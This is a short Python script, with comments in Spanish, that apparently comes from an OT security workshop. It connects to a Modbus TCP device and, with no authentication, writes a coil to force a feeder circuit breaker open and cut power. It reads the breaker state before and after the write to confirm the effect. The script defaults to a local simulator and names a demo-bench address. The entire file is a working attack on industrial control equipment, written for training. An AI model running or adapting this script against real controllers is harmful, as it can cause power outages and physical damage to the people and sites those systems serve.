#!/usr/bin/env python3
"""
DEPSA · Fase 3 — Impacto controlado sobre el interruptor del alimentador AL-07.
Workshop "Hands-on Cyber OT" (h4ck3d X 2026).

Fuerza la APERTURA del interruptor escribiendo 0 en la bobina Modbus 0,
SIN autenticacion (ese es justamente el punto del ejercicio).

USO SOLO EN ENTORNO AUTORIZADO:
  - Por defecto apunta al simulador local (127.0.0.1).
  - El instructor puede apuntarlo al LOGO del banco de demostracion.
  NUNCA contra un sistema real ni fuera del alcance autorizado.
"""
from pymodbus.client import ModbusTcpClient

HOST = "127.0.0.1"   # simulador local; el instructor usa la IP del LOGO del banco (10.3.5.22)
PORT = 502
COIL = 0             # bobina que comanda el interruptor AL-07
UNIT = 1             # unit id del esclavo Modbus; en pymodbus 3.6.9 el parametro es slave=


def estado(bit):
    return "CERRADO (con luz)" if bit else "ABIERTO (sin luz)"


def main():
    c = ModbusTcpClient(HOST, port=PORT)
    if not c.connect():
        raise SystemExit(f"No pude conectar a {HOST}:{PORT}")
    antes = c.read_coils(COIL, 1, slave=UNIT).bits[0]
    print("Estado inicial:", estado(antes))
    c.write_coil(COIL, False, slave=UNIT)            # forzar APERTURA
    despues = c.read_coils(COIL, 1, slave=UNIT).bits[0]
    print("Estado final  :", estado(despues))
    c.close()


if __name__ == "__main__":
    main()
